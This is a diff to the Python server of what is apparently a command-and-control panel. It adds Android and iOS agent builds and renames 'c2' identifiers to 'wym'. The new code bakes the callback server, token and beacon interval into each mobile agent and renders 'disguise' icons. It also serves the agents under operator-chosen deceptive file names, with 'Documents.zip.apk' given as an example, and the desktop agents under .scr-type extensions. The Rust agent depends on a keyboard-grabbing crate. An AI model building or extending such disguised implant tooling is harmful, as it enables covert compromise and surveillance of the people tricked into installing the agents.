     "darwin_x64":  {"os": "darwin",  "arch": "amd64",  "ext": "",    "goos": "darwin",  "goarch": "amd64",  "rust": "x86_64-apple-darwin",            "dotnet": "osx-x64",      "cc": "o64-clang", "cxx": "o64-clang++"},
     "darwin_arm64":{"os": "darwin",  "arch": "arm64",  "ext": "",    "goos": "darwin",  "goarch": "arm64",  "rust": "aarch64-apple-darwin",           "dotnet": "osx-arm64",    "cc": "oa64-clang", "cxx": "oa64-clang++"},
+    "android":     {"os": "android", "arch": "arm64-v8a", "ext": ".apk", "mobile": True},
+    "ios":         {"os": "ios",     "arch": "arm64",     "ext": ".ipa", "mobile": True},
 }
 
 
@@ -2056,20 +2102,24 @@ def _norm_ext(ext: str) -> str:
 
 
 def _target_labels(target: str) -> tuple[str, str]:
-    """'win_x64' -> ('win', 'x64'); 'linux_arm64' -> ('linux', 'arm64')."""
+    """'win_x64' -> ('win', 'x64'); 'linux_arm64' -> ('linux', 'arm64');
+    mobile targets carry no arch label ('android' -> ('android', ''))."""
     parts = (target or "").split("_", 1)
     return (parts[0], parts[1]) if len(parts) == 2 else (parts[0], "")
 
 
 def _artifact_name(language: str, target: str, ext: str = "") -> str:
-    """Uniform output name: wym_<lang>_<os>_<arch><ext> for every language
-    (java included, e.g. wym_java_win_x64.jar).
+    """Uniform output name: wym_<lang>_<os>_<arch>.<ext> for every language
+    (java included, e.g. wym_java_win_x64.jar). Mobile targets drop the empty
+    arch label: wym_android.apk / wym_ios.ipa.
 
     ext is normalized with a leading dot ('exe' -> '.exe'); empty ext = no
     extension (Linux/macOS binaries). Names are deterministic per lang+target,
     so the build cache check is 'the file exists AND its .hash marker still
     matches the current source hash' (stale builds get rebuilt in place)."""
     os_label, arch_label = _target_labels(target)
+    if os_label in ("android", "ios"):
+        return f"wym_{os_label}{_norm_ext(ext)}"
     return f"wym_{language}_{os_label}_{arch_label}{_norm_ext(ext)}"
 
 # Serialize server-side builds. Same-target races would corrupt the build cache;
@@ -2085,11 +2135,19 @@ _BUILD_JOBS: dict[str, dict] = {}
 _BUILD_JOB_TTL = 900.0
 
 
-def _source_hash(language: str) -> str:
+def _source_hash(language: str, variant: str = "") -> str:
     """Hash of the exact source(s) each language build consumes, used for
-    cache invalidation so source edits always get rebuilt."""
+    cache invalidation so source edits always get rebuilt. For mobile targets
+    the whole template tree is hashed, plus the disabled-file-type icon kind
+    and the artifact name (variant) that get baked in at build time."""
     h = hashlib.sha256()
-    if language == "go":
+    if language in ("android", "ios"):
+        base = CLIENTS_DIR / "mobile" / language
+        if base.is_dir():
+            for f in sorted(base.rglob("*")):
+                if f.is_file():
+                    h.update(f.read_bytes())
+    elif language == "go":
         for f in sorted(CLIENTS_DIR.glob("*.go")):
             if f.is_file():
                 h.update(f.read_bytes())
@@ -2100,6 +2158,7 @@ def _source_hash(language: str) -> str:
         f = CLIENTS_DIR / name
         if f.is_file():
             h.update(f.read_bytes())
+    h.update(b"\x00" + variant.encode("utf-8"))
     return h.hexdigest()[:16]
 
 
@@ -2240,7 +2299,8 @@ def _run_build_cmd(cmd, cwd=None, env=None, on_line=None, timeout=120):
     return rc, "\n".join(lines)
 
 
-def _build_binary(language: str, target: str = "", on_line=None) -> tuple[Path | None, str]:
+def _build_binary(language: str, target: str = "", icon: str = "", name: str = "",
+                  cfg: dict | None = None, on_line=None) -> tuple[Path | None, str]:
     """Compile an agent for a given target platform. Return (binary_path, error).
 
     Runs inside a thread lock: a long cross-compile must never run twice for the
@@ -2248,12 +2308,215 @@ def _build_binary(language: str, target: str = "", on_line=None) -> tuple[Path |
     routes are sync 'def' so a build never blocks the uvicorn event loop.
     on_line() (optional) is called for each line of build output as it streams."""
     with _BUILD_LOCK:
-        return _build_binary_locked(language, target, on_line=on_line)
+        return _build_binary_locked(language, target, icon=icon, name=name,
+                                    cfg=cfg, on_line=on_line)
 
 
-def _build_binary_locked(language: str, target: str = "", on_line=None) -> tuple[Path | None, str]:
+# ---------------------------------------------------------------------------
+# Mobile builds (Android APK via Gradle / iOS IPA via xcrun swiftc)
+# ---------------------------------------------------------------------------
+
+def _sanitize_mobile_name(name: str, fallback: str = "WymC2") -> str:
+    """Keep only portable filename chars; no path separators, shell metachars
+    or leading dots (hidden files / traversal are impossible)."""
+    s = re.sub(r"[^A-Za-z0-9 _.\-]", "", name or "").strip()
+    s = re.sub(r"^\.+", "", s)
+    s = re.sub(r"\s+", " ", s)[:48]
+    return s or fallback
+
+
+def _java_escape(s: str) -> str:
+    return (s or "").replace("\\", "\\\\").replace('"', '\\"')
+
+
+def _swift_escape(s: str) -> str:
+    return (s or "").replace("\\", "\\\\").replace('"', '\\"')
+
+
+def _xml_escape(s: str) -> str:
+    return ((s or "").replace("&", "&amp;").replace("<", "&lt;")
+            .replace(">", "&gt;").replace('"', "&quot;"))
+
+
+def _inject_file(path: Path, pairs: dict[str, str]) -> None:
+    text = path.read_text(encoding="utf-8")
+    for key, val in pairs.items():
+        text = text.replace(key, val)
+    path.write_text(text, encoding="utf-8")
+
+
+def _build_android_apk(work: Path, icon_kind: str, app_name: str, server: str,
+                       token: str, interval: int, note) -> str | None:
+    """Copy the android template, bake config + assets, run Gradle. None = ok."""
+    src = CLIENTS_DIR / "mobile" / "android"
+    if not src.is_dir():
+        return "mobile android template not found"
+    shutil.copytree(src, work, dirs_exist_ok=True)
+
+    cfg = work / "app" / "src" / "main" / "java" / "com" / "wym" / "c2" / "Config.java"
+    if not cfg.is_file():
+        return "Config.java missing in template"
+    _inject_file(cfg, {"@@SERVER@@": _java_escape(server),
+                       "@@TOKEN@@": _java_escape(token),
+                       "@@INTERVAL@@": str(max(1, int(interval)))})
+    strings = work / "app" / "src" / "main" / "res" / "values" / "strings.xml"
+    if strings.is_file():
+        _inject_file(strings, {"@@APP_NAME@@": _xml_escape(app_name)})
+
+    for dpi, (px, png) in icons.android_mipmaps(icon_kind).items():
+        out = work / "app" / "src" / "main" / "res" / f"mipmap-{dpi}" / "ic_launcher.png"
+        out.parent.mkdir(parents=True, exist_ok=True)
+        out.write_bytes(png)
+    note(f"icon '{icon_kind}' rendered; label '{app_name}'")
+
+    gradle = shutil.which("gradle") or shutil.which("gradle.bat")
+    if not gradle:
+        return ("gradle not found — Android builds require the Gradle build tool "
+                "on PATH (install it or set your Android distribution's gradle dir).")
+    cmd = [gradle, "assembleRelease", "--no-daemon", "--console=plain",
+           "-p", str(work)]
+    if cmd[0].lower().endswith((".bat", ".cmd")):
+        cmd = ["cmd", "/c", gradle, "assembleRelease", "--no-daemon",
+               "--console=plain", "-p", str(work)]
+    env = os.environ.copy()
+    rc, out = _run_build_cmd(cmd, cwd=work, env=env, on_line=note, timeout=1800)
+    if rc != 0:
+        return out.strip() or "gradle build failed"
+    return None
+
+
+def _build_ios_ipa(work: Path, icon_kind: str, app_name: str, server: str,
+                   token: str, interval: int, note) -> str | None:
+    """Copy the ios template, bake config, compile with xcrun swiftc, zip the
+    Payload dir with ditto (or zip). None = ok."""
+    src = CLIENTS_DIR / "mobile" / "ios"
+    if not src.is_dir():
+        return "mobile ios template not found"
+    shutil.copytree(src, work, dirs_exist_ok=True)
+
+    cfg = work / "WymC2" / "Config.swift"
+    if not cfg.is_file():
+        return "Config.swift missing in template"
+    _inject_file(cfg, {"@@APP_NAME@@": _swift_escape(app_name),
+                       "@@SERVER@@": _swift_escape(server),
+                       "@@TOKEN@@": _swift_escape(token),
+                       "@@INTERVAL@@": str(max(1, int(interval)))})
+    plist = work / "WymC2" / "Info.plist"
+    if plist.is_file():
+        _inject_file(plist, {"@@APP_NAME@@": _xml_escape(app_name)})
+
+    app_dir = work / "Payload" / "WymC2.app"
+    app_dir.mkdir(parents=True, exist_ok=True)
+    if plist.is_file():
+        shutil.copy2(plist, app_dir / "Info.plist")
+    # bundle icons referenced by Info.plist (CFBundleIconFiles), rendered for
+    # the chosen disguise kind
+    want = {"AppIcon-60@2x.png", "AppIcon-60@3x.png",
+            "AppIcon-76@2x.png", "AppIcon-83.5@2x.png"}
+    for fname, (_px, png) in icons.ios_appicons(icon_kind).items():
+        if fname in want:
+            (app_dir / fname).write_bytes(png)
+    note(f"icon '{icon_kind}' rendered; label '{app_name}'")
+
+    xcrun = shutil.which("xcrun") or shutil.which("xcrun.bat")
+    if not xcrun:
+        return "iOS builds require macOS with Xcode Command Line Tools"
+    sdk_proc = subprocess.run([xcrun, "--sdk", "iphoneos", "--show-sdk-path"],
+                              capture_output=True, text=True, timeout=60)
+    if sdk_proc.returncode != 0:
+        return "iOS builds require the iOS SDK (Xcode + iphoneos platform)"
+    sdk = sdk_proc.stdout.strip()
+    if not sdk:
+        return "iOS builds require the iOS SDK (Xcode + iphoneos platform)"
+
+    sources = sorted((work / "WymC2").glob("*.swift"))
+    if not sources:
+        return "no Swift sources in template"
+    cmd = [xcrun, "swiftc", "-sdk", sdk, "-target", "arm64-apple-ios13.0",
+           "-O", "-module-name", "WymC2",
+           "-o", str(app_dir / "WymC2")] + [str(s) for s in sources]
+    rc, out = _run_build_cmd(cmd, cwd=work, on_line=note, timeout=1800)
+    if rc != 0:
+        return out.strip() or "swiftc failed"
+    if not (app_dir / "WymC2").is_file():
+        return "swift build produced no binary"
+
+    ipa_tmp = work / "wym.ipa"
+    rc, out = _run_build_cmd([xcrun, "ditto", "-c", "-k", "--sequesterRsrc",
+                              "--keepParent", str(work / "Payload"), str(ipa_tmp)],
+                             cwd=work, on_line=note, timeout=300)
+    if rc != 0 or not ipa_tmp.is_file():
+        # ditto missing on odd setups -> plain zip of the Payload dir
+        import zipfile
+        ipa_tmp.unlink(missing_ok=True)
+        try:
+            with zipfile.ZipFile(ipa_tmp, "w", zipfile.ZIP_DEFLATED) as z:
+                for f in sorted((work / "Payload").rglob("*")):
+                    if f.is_file():
+                        z.write(f, "Payload/" + f.relative_to(work / "Payload").as_posix())
+        except Exception as e:
+            return f"ipa packaging failed: {e}"
+    return None
+
+
+def _build_mobile_locked(language: str, target: str, t: dict, icon: str, name: str,
+                         cfg: dict | None, on_line) -> tuple[Path | None, str]:
+    """APK/IPA build with the same cache-marker discipline as desktop targets.
+    The baked config (server/token/interval) plus icon kind and artifact name are
+    folded into the source hash, so a cached artifact is never served with stale
+    injected values."""
+    note = on_line if on_line else (lambda msg: None)
+    ext = t["ext"]
+    icon_kind = (icon or "none").strip().lower()
+    if icon_kind not in icons.KIND_STYLES:
+        icon_kind = "none"
+    app_name = _sanitize_mobile_name(name)
+    cfg = cfg or {}
+    server = (cfg.get("server") or "http://localhost:8000").strip().rstrip("/")
+    token = cfg.get("token") or getattr(app.state, "agent_token", "") or ""
+    interval = int(cfg.get("interval") or 10)
+    variant = f"{icon_kind}|{app_name}|{server}|{token}|{interval}"
+
+    out_path = BUILDS_DIR / _artifact_name(language, target, ext)
+    hash_path = BUILDS_DIR / _artifact_name(language, target, ".hash")
+    if (out_path.is_file() and hash_path.is_file()
+            and hash_path.read_text().strip() == _source_hash(language, variant)):
+        note(f"[cache hit] reusing {out_path.name}")
+        return out_path, ""
+
+    out_path.unlink(missing_ok=True)
+    hash_path.unlink(missing_ok=True)
+
+    work = Path(tempfile.mkdtemp(prefix="wym_build_"))
+    note(f"building {language} for {target} ...")
+    try:
+        if language == "android":
+            err = _build_android_apk(work, icon_kind, app_name, server, token,
+                                     interval, note)
+            if err:
+                return None, err
+            built = work / "app" / "build" / "outputs" / "apk" / "release" / "app-release.apk"
+        else:
+            err = _build_ios_ipa(work, icon_kind, app_name, server, token,
+                                 interval, note)
+            if err:
+                return None, err
+            built = work / "wym.ipa"
+        if not built.is_file():
+            return None, "build produced no output"
+        shutil.move(str(built), str(out_path))
+        hash_path.write_text(_source_hash(language, variant), encoding="utf-8")
+        return out_path, ""
+    except Exception as e:
+        return None, str(e)
+    finally:
+        shutil.rmtree(work, ignore_errors=True)
+
+
+def _build_binary_locked(language: str, target: str = "", icon: str = "", name: str = "",
+                         cfg: dict | None = None, on_line=None) -> tuple[Path | None, str]:
     note = (lambda msg: on_line(msg)) if on_line else (lambda msg: None)
-    if language not in ("go", "csharp", "rust", "c", "cpp", "java"):
+    if language not in ("go", "csharp", "rust", "c", "cpp", "java", "android", "ios"):
         return None, f"unsupported language: {language}"
     if language == "csharp" and target and not target.startswith("win_"):
         return None, "C# builds only support Windows targets (win_x64, win_x86)"
@@ -2262,6 +2525,11 @@ def _build_binary_locked(language: str, target: str = "", on_line=None) -> tuple
     if target not in BUILD_TARGETS:
         return None, f"unknown target: {target}"
     t = BUILD_TARGETS[target]
+    if language in MOBILE_LANGUAGES:
+        if target not in MOBILE_LANGUAGES:
+            target = language
+            t = BUILD_TARGETS[target]
+        return _build_mobile_locked(language, target, t, icon, name, cfg, on_line)
     ext = t["ext"]
     # Deterministic artifact naming: wym_<lang>_<os>_<arch><ext> (java included,
     # e.g. wym_java_win_x64.jar). Cache correctness relies on the .hash marker:
@@ -2283,10 +2551,7 @@ def _build_binary_locked(language: str, target: str = "", on_line=None) -> tuple
         if not src.is_file():
             return None, "source not found"
 
-    work = BUILD_WORK_DIR
-    if work.exists():
-        shutil.rmtree(work, ignore_errors=True)
-    work.mkdir(exist_ok=True)
+    work = Path(tempfile.mkdtemp(prefix="wym_build_"))
     note(f"compiling {language} for {target} ...")
     try:
         if language == "go":
@@ -2294,7 +2559,7 @@ def _build_binary_locked(language: str, target: str = "", on_line=None) -> tuple
             for f in CLIENTS_DIR.glob("*.go"):
                 shutil.copy2(f, work / f.name)
             # create go.mod
-            (work / "go.mod").write_text("module c2agent\n\ngo 1.21\n", encoding="utf-8")
+            (work / "go.mod").write_text("module wymagent\n\ngo 1.21\n", encoding="utf-8")
             env = os.environ.copy()
             env["GOOS"] = t["goos"]
             env["GOARCH"] = t["goarch"]
@@ -2327,13 +2592,13 @@ def _build_binary_locked(language: str, target: str = "", on_line=None) -> tuple
 </Project>
 """, encoding="utf-8")
             rc, out = _run_build_cmd(
-                ["dotnet", "publish", "-c", "Release", "-o", "_c2out", "--nologo"],
+                ["dotnet", "publish", "-c", "Release", "-o", "_wymout", "--nologo"],
                 cwd=work, env=_build_env(), on_line=on_line, timeout=120
             )
             if rc != 0:
                 return None, out.strip()
             # find the binary
-            out_dir = work / "_c2out"
+            out_dir = work / "_wymout"
             candidates = list(out_dir.glob(f"agent*{ext}")) + list(out_dir.glob(f"*{ext}"))
             if not candidates:
                 return None, "build produced no output"
@@ -2342,16 +2607,17 @@ def _build_binary_locked(language: str, target: str = "", on_line=None) -> tuple
             return out_path, ""
 
         elif language == "rust":
-            cargo_dir = work / "_c2cargo"
+            cargo_dir = work / "_wymcargo"
             rc, out = _run_build_cmd(
-                ["cargo", "init", "--name", "c2agent", str(cargo_dir)],
+                ["cargo", "init", "--name", "wymagent", str(cargo_dir)],
                 on_line=on_line, timeout=30)
             if rc != 0:
                 return None, out.strip()
             (cargo_dir / "Cargo.toml").write_text("""[package]
-name = "c2agent"
+name = "wymagent"
 version = "0.1.0"
 edition = "2021"
+rust-version = "1.80"
 
 [dependencies]
 serde = { version = "1", features = ["derive"] }
@@ -2360,6 +2626,10 @@ reqwest = { version = "0.12", features = ["blocking", "multipart", "json"] }
 rdev = { version = "0.5", features = ["unstable_grab"] }
 hostname = "0.4"
 rand = "0.8"
+# pinned deps: keep resolution compatible with rustc 1.85 (crates.io moved
+# these transitively to MSRV 1.86+ via idna_adapter/icu/encoding_rs).
+url = "=2.5.2"
+encoding_rs = "=0.8.35"
 """, encoding="utf-8")
             shutil.copy2(src, cargo_dir / "src" / "main.rs")
             rust_target = t["rust"]
@@ -2393,7 +2663,7 @@ rand = "0.8"
                 )
             if rc != 0:
                 return None, out.strip()
-            bin_name = f"c2agent{ext}"
+            bin_name = f"wymagent{ext}"
             built = ts_target / rust_target / "release" / bin_name
             if not built.is_file():
                 return None, "build produced no output"
@@ -2513,7 +2783,8 @@ def _build_append_history(entry: dict) -> None:
             pass
 
 
-def _run_build_job(job_id: str, language: str, target: str) -> None:
+def _run_build_job(job_id: str, language: str, target: str, icon: str = "",
+                   name: str = "", cfg: dict | None = None) -> None:
     """Worker thread: run one server-side build, appending each output line to
     the job's log (in-memory for the live popup AND a persisted log file for
     error/fix tracking) and recording the finished build in history.json."""
@@ -2540,7 +2811,8 @@ def _run_build_job(job_id: str, language: str, target: str) -> None:
     ok, msg = True, ""
     with _BUILD_LOCK:
         try:
-            path, err = _build_binary_locked(language, target, on_line=log)
+            path, err = _build_binary_locked(language, target, icon=icon,
+                                             name=name, cfg=cfg, on_line=log)
             if err:
                 ok, msg = False, err
             else:
@@ -2580,6 +2852,8 @@ def _run_build_job(job_id: str, language: str, target: str) -> None:
 class BuildStartIn(BaseModel):
     language: str
     target: str = "win_x64"
+    icon: str = "none"
+    name: str = ""
 
 
 @app.post("/api/build/start", include_in_schema=False)
@@ -2589,12 +2863,16 @@ def api_build_start(request: Request, body: BuildStartIn):
         raise HTTPException(status_code=401, detail="not authenticated")
     language = body.language.strip()
     target = body.target.strip() or "win_x64"
-    if language not in ("go", "csharp", "rust", "c", "cpp", "java"):
+    allowed = COMPILED_LANGUAGES | MOBILE_LANGUAGES
+    if language not in allowed:
         raise HTTPException(status_code=400, detail=f"unsupported language: {language}")
+    if language in MOBILE_LANGUAGES and target not in MOBILE_LANGUAGES:
+        target = language
     if target not in BUILD_TARGETS:
         raise HTTPException(status_code=400, detail=f"unknown target: {target}")
-    if language == "csharp" and not target.startswith("win_"):
-        raise HTTPException(status_code=400, detail="C# builds only support Windows targets")
+    cfg = {"server": str(request.base_url).rstrip("/"),
+           "token": getattr(app.state, "agent_token", "") or "",
+           "interval": 10}
     job_id = secrets.token_hex(8)
     with _BUILD_JOB_LOCK:
         now = time.time()
@@ -2604,7 +2882,9 @@ def api_build_start(request: Request, body: BuildStartIn):
         _BUILD_JOBS[job_id] = {"lines": [], "done": False, "success": False,
                                "message": "", "started": now,
                                "language": language, "target": target}
-    threading.Thread(target=_run_build_job, args=(job_id, language, target),
+    threading.Thread(target=_run_build_job,
+                     args=(job_id, language, target),
+                     kwargs={"icon": body.icon, "name": body.name, "cfg": cfg},
                      daemon=True).start()
     return {"job_id": job_id, "language": language, "target": target}
 
@@ -2621,14 +2901,20 @@ def api_build_log(request: Request, job_id: str):
 
 
 @app.post("/api/build/{language}")
-def api_build_agent(request: Request, language: str, target: str = "win_x64"):
+def api_build_agent(request: Request, language: str, target: str = "win_x64",
+                    icon: str = "none", name: str = ""):
     """Build an agent binary on the server for a specific target platform."""
     user = get_current_user(request)
     if not user:
         raise HTTPException(status_code=401, detail="not authenticated")
-    if language not in ("go", "csharp", "rust", "c", "cpp", "java"):
+    if language not in COMPILED_LANGUAGES | MOBILE_LANGUAGES:
         raise HTTPException(status_code=400, detail=f"unsupported: {language}")
-    path, err = _build_binary(language, target)
+    if language in MOBILE_LANGUAGES and target not in MOBILE_LANGUAGES:
+        target = language
+    cfg = {"server": str(request.base_url).rstrip("/"),
+           "token": getattr(app.state, "agent_token", "") or "",
+           "interval": 10}
+    path, err = _build_binary(language, target, icon=icon, name=name, cfg=cfg)
     if err:
         raise HTTPException(status_code=500, detail=err)
     return {"path": f"/download/build/{language}?target={target}", "file": path.name}
@@ -2681,7 +2967,7 @@ def api_build_log_clear(request: Request):
 
 @app.get("/download/build/{language}", include_in_schema=False)
 async def download_build(request: Request, language: str, target: str = "win_x64",
-                         token: str = "", ext: str = ""):
+                         token: str = "", ext: str = "", name: str = ""):
     user = get_current_user(request)
     if not user:
         hdr = request.headers.get("x-agent-token", "")
@@ -2689,15 +2975,23 @@ async def download_build(request: Request, language: str, target: str = "win_x64
         expected = app.state.agent_token
         if not expected or not tok or not secrets.compare_digest(tok, expected):
             raise HTTPException(status_code=401, detail="authentication required")
+    if language in MOBILE_LANGUAGES:
+        target = language
     t = BUILD_TARGETS.get(target)
     if not t:
         raise HTTPException(status_code=400, detail="unknown target")
-    # On-disk artifact carries the platform default extension (a JAR for java);
-    # the served filename may carry a requested (.exe/.scr/.out/…) extension
-    # instead. Name is deterministic per lang+target: wym_<lang>_<os>_<arch>.
+    # On-disk artifact carries the platform default extension (a JAR for java,
+    # .apk/.ipa for mobile); the served filename may carry a requested
+    # (.exe/.scr/.out/…) extension for desktop, or an operator-chosen name for
+    # mobile disguised builds (name param, e.g. "Documents.zip.apk").
     disk_ext = ".jar" if language == "java" else t["ext"]
     path = BUILDS_DIR / _artifact_name(language, target, disk_ext)
-    fname = _artifact_name(language, target, ext or disk_ext)
+    if name.strip():
+        fname = _sanitize_mobile_name(name, "WymC2")
+        if not fname.lower().endswith(disk_ext.lower()):
+            fname += disk_ext
+    else:
+        fname = _artifact_name(language, target, ext or disk_ext)
     if not path.is_file():
         raise HTTPException(status_code=404, detail="binary not found — build first")
     return FileResponse(path, media_type="application/octet-stream", filename=fname)
@@ -3599,7 +3893,7 @@ async def users_create(
     if not auth.authenticate(user, current_password):
         return templates.TemplateResponse(
             request, "users.html",
-            {"user": user, "users": users, "error": f"Re-authentication failed for '{user}' — enter the current password of this account. Forgot it? Restart the server with C2_PASSWORD=<new password> to reset it.", "ok": None},
+            {"user": user, "users": users, "error": f"Re-authentication failed for '{user}' — enter the current password of this account. Forgot it? Restart the server with WYM_PASSWORD=<new password> to reset it.", "ok": None},
             status_code=400,
         )
     ok, err = auth.create_user(new_username, new_password)
@@ -3626,7 +3920,7 @@ async def users_delete(request: Request, del_username: str = Form(...), current_
     if not auth.authenticate(user, current_password):
         return templates.TemplateResponse(
             request, "users.html",
-            {"user": user, "users": auth.list_users(), "error": f"Re-authentication failed for '{user}' — enter the current password of this account. Forgot it? Restart the server with C2_PASSWORD=<new password> to reset it.", "ok": None},
+            {"user": user, "users": auth.list_users(), "error": f"Re-authentication failed for '{user}' — enter the current password of this account. Forgot it? Restart the server with WYM_PASSWORD=<new password> to reset it.", "ok": None},
             status_code=400,
         )
     if del_username == user:
@@ -3727,8 +4021,8 @@ if __name__ == "__main__":
     )
     uvicorn.run(
         "main:app",
-        host=os.environ.get("C2_HOST", "127.0.0.1"),
-        port=int(os.environ.get("C2_PORT", "8000")),
+        host=os.environ.get("WYM_HOST", "127.0.0.1"),
+        port=int(os.environ.get("WYM_PORT", "8000")),
         log_level="info",
         log_config=_build_log_config(),
     )
